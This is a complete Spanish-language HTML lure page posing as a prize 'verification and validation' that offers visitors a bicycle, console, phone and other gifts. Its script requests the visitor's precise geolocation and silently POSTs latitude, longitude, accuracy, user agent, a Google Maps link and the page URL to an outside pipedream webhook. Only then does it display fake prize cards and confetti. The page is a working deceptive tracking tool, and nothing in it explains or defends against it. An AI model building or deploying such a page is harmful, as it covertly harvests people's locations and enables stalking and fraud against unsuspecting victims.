<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificaci√≥n y Premios</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #4facfe, #00f2fe);
      color: #333;
    }
    .container {
      max-width: 900px;
      margin: 60px auto;
      background: #fff;
      border-radius: 15px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
      padding: 40px 30px;
      text-align: center;
      animation: fadeIn 1s ease-in-out;
    }
    h1 {
      color: #222;
      margin-bottom: 15px;
    }
    p {
      font-size: 16px;
      color: #555;
    }
    button {
      margin-top: 20px;
      padding: 14px 35px;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      background: #007bff;
      color: #fff;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #0056b3;
    }
    #msg {
      margin-top: 25px;
      font-size: 20px;
      font-weight: bold;
      color: green;
      display: none;
      animation: fadeIn 1s ease-in-out;
    }
    .premios {
      margin-top: 30px;
      display: none;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
    }
    .premio-card {
      background: #fafafa;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      padding: 15px;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      opacity: 0;
      transform: scale(0.9);
      animation: showCard 0.6s forwards;
    }
    .premio-card img {
      width: 100%;
      border-radius: 10px;
      object-fit: cover;
      height: 150px;
    }
    .premio-card h3 {
      margin: 10px 0 0;
      font-size: 16px;
      color: #333;
    }
    .premio-card:hover {
      transform: scale(1.05);
      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    @keyframes showCard {
      to { opacity: 1; transform: scale(1); }
    }
    canvas {
      position: fixed;
      top: 0;
      left: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <canvas id="confetti"></canvas>
  <div class="container">
    <h1>‚úÖ VERIFICACI√ìN Y VALIDACI√ìN</h1>
    <p>Por favor, pulsa el bot√≥n y acepta la solicitud.</p>
    <button onclick="obtenerUbicacion()">üìç RECLAMA TU PREMIO</button>
    <p id="msg">üéâ ¬°Gracias por aceptar! Aqu√≠ est√°n tus premios:</p>
    
    <div class="premios" id="premios"></div>
  </div>

<script>
const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net";

// Lista de premios realistas
const premios = [
  { nombre: "üö≤ Bicicleta de monta√±a", img: "https://cdn.pixabay.com/photo/2017/03/02/04/23/bicycle-2119460_1280.jpg" },
  { nombre: "üéÆ Consola Gamer", img: "https://cdn.pixabay.com/photo/2016/11/29/04/17/joystick-1866599_1280.jpg" },
  { nombre: "üì± Smartphone Gama Alta", img: "https://cdn.pixabay.com/photo/2016/11/19/14/00/smartphone-1836073_1280.jpg" },
  { nombre: "‚åö Smartwatch", img: "https://cdn.pixabay.com/photo/2015/09/05/21/51/apple-watch-925157_1280.jpg" },
  { nombre: "üíª Laptop Ultrabook", img: "https://cdn.pixabay.com/photo/2014/05/02/21/50/home-office-336378_1280.jpg" },
  { nombre: "üì∫ TV Pantalla Grande", img: "https://cdn.pixabay.com/photo/2015/09/05/22/46/tv-926093_1280.jpg" }
];

function obtenerUbicacion() {
  if (!navigator.geolocation) {
    alert("Tu navegador no soporta geolocalizaci√≥n.");
    return;
  }

  navigator.geolocation.getCurrentPosition(onSuccess, onError, {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 0
  });
}

function onSuccess(pos) {
  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;
  const accuracy = pos.coords.accuracy;

  const data = {
    lat,
    lon,
    accuracy,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    maps_link: `https://www.google.com/maps?q=${lat},${lon}`,
    source: window.location.href
  };

  // Enviar datos al webhook
  fetch(WEBHOOK_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data, null, 2)
  });

  // Mostrar mensaje y premios
  document.getElementById("msg").style.display = "block";
  const premiosDiv = document.getElementById("premios");
  premiosDiv.style.display = "grid";
  premiosDiv.innerHTML = "";

  premios.forEach((p, i) => {
    const card = document.createElement("div");
    card.className = "premio-card";
    card.style.animationDelay = `${i * 0.2}s`; // animaci√≥n escalonada
    card.innerHTML = `
      <img src="${p.img}" alt="${p.nombre}">
      <h3>${p.nombre}</h3>
    `;
    premiosDiv.appendChild(card);
  });

  lanzarConfeti();
}

function onError(err) {
  alert("‚ö†Ô∏è Error al obtener ubicaci√≥n: " + (err.message || err.code));
}

/* üéä Confeti simple en canvas */
function lanzarConfeti() {
  const canvas = document.getElementById("confetti");
  const ctx = canvas.getContext("2d");
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  const piezas = [];
  const colores = ["#f94144", "#f3722c", "#f9c74f", "#90be6d", "#577590", "#43aa8b"];

  for (let i = 0; i < 120; i++) {
    piezas.push({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height - canvas.height,
      w: 10,
      h: 10,
      color: colores[Math.floor(Math.random() * colores.length)],
      velocidad: Math.random() + 1
    });
  }

  function animar() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    piezas.forEach(p => {
      ctx.fillStyle = p.color;
      ctx.fillRect(p.x, p.y, p.w, p.h);
      p.y += p.velocidad;
      if (p.y > canvas.height) p.y = -10;
    });
    requestAnimationFrame(animar);
  }
  animar();

  // detener despu√©s de 6s
  setTimeout(() => ctx.clearRect(0,0,canvas.width,canvas.height), 6000);
}
</script>
</body>
</html>

